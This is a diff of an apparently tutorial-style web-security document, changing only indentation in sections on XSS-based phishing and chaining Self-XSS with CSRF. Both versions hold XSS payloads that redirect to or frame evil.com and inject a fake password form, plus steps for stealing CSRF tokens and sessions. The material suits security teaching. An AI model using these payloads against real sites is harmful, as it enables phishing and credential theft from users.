@@ -159,42 +159,42 @@ audit or other methods to intercept the HTTP request information when adding the
 XMLHTTP object to send an HTTP request in the background. The request is accompanied by the cookies of the attacked and
 sent to the server together, and then the operation of adding an administrator account can be realized.
 
-### phishing
+### Phishing
 
 - Redirect phishing
 
-Redirect the current page to a phishing page.
-
-```text
-http://www.bug.com/index.php?search="'><script>document.location.href="http://www.evil.com"</script>
-```
+      Redirect the current page to a phishing page.
+      
+      ```text
+      http://www.bug.com/index.php?search="'><script>document.location.href="http://www.evil.com"</script>
+      ```
 
 - HTML injection phishing
 
-Use XSS vulnerabilities to inject HTML or JavaScript code into the page.
-
-```text
-http://www.bug.com/index.php?search="'<html><head><title>login</title></head><body><div style="text-align:center; "><form Method="POST" Action="phishing.php" Name="form"><br /><br />Login:<br/><input name="login" /><br />Password :<br/><input name="Password" type="password" /><br/><br/><input name="Valid" value="Ok" type="submit" /><br/> </form></div></body></html>
-```
-
-This code will embed a Form in the normal page.
+      Use XSS vulnerabilities to inject HTML or JavaScript code into the page.
+      
+      ```text
+      http://www.bug.com/index.php?search="'<html><head><title>login</title></head><body><div style="text-align:center; "><form Method="POST" Action="phishing.php" Name="form"><br /><br />Login:<br/><input name="login" /><br />Password :<br/><input name="Password" type="password" /><br/><br/><input name="Valid" value="Ok" type="submit" /><br/> </form></div></body></html>
+      ```
+      
+      This code will embed a Form in the normal page.
 
 - iframe fishing
 
-This method uses the `<iframe>` tag to embed a page in a remote domain to implement phishing.
-
-```text
-http://www.bug.com/index.php?search='><iframe src="http://www.evil.com" height="100%" width="100%"</iframe>
-```
+      This method uses the `<iframe>` tag to embed a page in a remote domain to implement phishing.
+      
+      ```text
+      http://www.bug.com/index.php?search='><iframe src="http://www.evil.com" height="100%" width="100%"</iframe>
+      ```
 
 - Flash fishing
 
-Transfer the constructed Flash file to the server and use the `<object>` or `<embed>` tag to reference it on the target
-website.
+      Transfer the constructed Flash file to the server and use the `<object>` or `<embed>` tag to reference it on the target
+      website.
 
 - Advanced fishing techniques
-
-Inject code to hijack HTML forms, use JavaScript to write keyloggers, etc.
+      
+      Inject code to hijack HTML forms, use JavaScript to write keyloggers, etc.
 
 ### Web page hanging horse
 
@@ -219,25 +219,24 @@ Self-XSS into a harmful vulnerability. The following will summarize some common 
 
 - CSRF exists for login and logout, Self-XSS for personal information, third-party login
 
-The general utilization process of this scenario is that the attacker first injects the payload into the personal
-information XSS point, and then the attacker creates a malicious page to induce the victim to visit, and the malicious
-page performs the following operations:
-
-1. The malicious page execution uses CSRF to let the victim log in to the attacker's personal information location and
-   trigger the XSS payload
-2. JavaScript Payload generates `<iframe>` tags, and performs the following operations in the frame
-3. Ask the victim to log out of the attacker's account
-4. Then let the victim log in to his account personal information interface through CSRF
-5. The attacker extracts the CSRF Token from the page
-6. Then you can use CSRF Token to submit and modify the user's personal information
-
-This attack process needs to pay attention to several points: the third step of login does not require user interaction,
-use Google Sign In and other non-password login methods to log in; **X-Frame-Options** needs to be set to the same
-source (this page Can be displayed in the `iframe` of the page with the same domain name)
+      The general utilization process of this scenario is that the attacker first injects the payload into the personal
+      information XSS point, and then the attacker creates a malicious page to induce the victim to visit, and the 
+      malicious page performs the following operations:
+      
+      1. The malicious page execution uses CSRF to let the victim log in to the attacker's personal information location
+         and trigger the XSS payload
+      2. JavaScript Payload generates `<iframe>` tags, and performs the following operations in the frame
+      3. Ask the victim to log out of the attacker's account
+      4. Then let the victim log in to his account personal information interface through CSRF
+      5. The attacker extracts the CSRF Token from the page
+      6. Then you can use CSRF Token to submit and modify the user's personal information
+      
+      This attack process needs to pay attention to several points: the third step of login does not require user 
+      interaction, use Google Sign In and other non-password login methods to log in; **X-Frame-Options** needs to be 
+      set to the same source (this page Can be displayed in the `iframe` of the page with the same domain name)
 
 - CSRF exists for login, Self-XSS exists for account information, OAUTH authentication
-
-1. Let the user log out of the account page, but do not log out of the OAUTH authorization page, this is to ensure that
-   the user can log in to his account page again
-2. Let users log in to our account page and XSS appears, and use the `<iframe>` tag to execute malicious code
-3. Log in to their respective accounts, but our XSS has been stolen to the Session
+      1. Let the user log out of the account page, but do not log out of the OAUTH authorization page, this is to ensure that
+         the user can log in to his account page again
+      2. Let users log in to our account page and XSS appears, and use the `<iframe>` tag to execute malicious code
+      3. Log in to their respective accounts, but our XSS has been stolen to the Session
